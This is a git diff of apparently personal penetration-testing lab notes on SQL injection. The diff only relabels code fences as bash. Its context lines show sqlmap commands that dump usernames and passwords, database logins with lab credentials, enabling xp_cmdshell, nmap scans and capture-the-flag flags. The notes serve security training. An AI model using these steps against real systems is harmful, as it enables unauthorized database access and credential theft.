@@ -64,7 +64,7 @@ Capture resulting shells or downloaded files as proof.
 
 Manual exploitation teaches you the structure; once mapped, pivot to `sqlmap` for breadth.
 
-```
+```bash
 sqlmap -u "https://portal.acme.local/product.php?id=1" --batch --level=3 --risk=2 --dump -D acme -T users -C username,password
 ```
 
@@ -132,7 +132,7 @@ In order to search the database, the SQL server runs the query SELECT * FROM use
 - Connect to SQL instance.
 - Run version to retrieve version of running instance.
 - Verify current DB user.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/shells]
 └─$ mysql -u root -p'root' -h 192.168.214.16 -P 3306 
 Welcome to the MariaDB monitor.  Commands end with ; or \g.
@@ -208,7 +208,7 @@ MySQL [(none)]>
   - Keyword `-windows-auth`
    - Forces NTLM auth instead of Kerberos.
 - Inspect current version of the underlying OS `@@version`
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/shells]
 └─$ impacket-mssqlclient Administrator:Lab123@192.168.214.18 -windows-auth
 Impacket v0.11.0 - Copyright 2023 Fortra
@@ -629,7 +629,7 @@ web application
   - Once enabled; must be called with EXECUTE keyword instead of SELECT.
 
 *In th example DB the Administrator user has the appropriate perms, enable xp_cmdshell by simulating SQLi via impacket-mssqlclient*
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/shells]
 └─$ impacket-mssqlclient Administrator:Lab123@192.168.209.18 -windows-auth
 Impacket v0.11.0 - Copyright 2023 Fortra
@@ -689,7 +689,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data) \N \N \N \N
  - Sqlmap.
   - Can ID and exploit SQLi vulns against various DB engines.
   - Set the URL we want to scan with `-u` and specify the parameter to test using `-p`
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/shells]
 └─$ sqlmap 192.168.209.19/blindsqli.php?user=1 -p user
         ___
@@ -750,7 +750,7 @@ back-end DBMS: MySQL >= 5.0.12
 
 - We can also dump the DB table and steal creds with sqlmap.
  - *Although sqlmap is a great tool to automate SQLi attacks, it provides next-to-zero stealth. Due to its high-volume of traffic, sqlmap should not be used as a first choice tool during assignments that require staying under the radar.*.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/shells]
 └─$ sqlmap 192.168.209.19/blindsqli.php?user=1 -p user --dump
         ___
@@ -1213,7 +1213,7 @@ OS{2edb78ffeaeba64232f91b2c8d03f383}
 
 
 Capstone Exercise: Enumerate the Module Exercise - VM #2 and exploit the SQLi vulnerability in order to get the flag.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/sqli/capstone-10.3-5]
 └─$ sudo nmap -sS -sV 192.168.212.48
 [sudo] password for operator: 
@@ -1499,7 +1499,7 @@ OS{42c0d162385627b8b4ffa06e3d149ea9}
 
 
 Capstone Exercise: Enumerate the Module Exercise - VM #3 and exploit the SQLi vulnerability in order to get the flag.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/sqli]
 └─$ sudo nmap -sS -sV 192.168.212.49
 [sudo] password for operator: 
@@ -1615,7 +1615,7 @@ OS{78e9846e2346582bfc14a5d39c6ab01e}
 
 
 Capstone Exercise: Enumerate the Module Exercise - VM #4 and exploit the SQLi vulnerability in order to get the flag.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/sqli/capstone-10.3-7]
 └─$ sudo nmap -sS -sV 192.168.212.50
 [sudo] password for operator: 
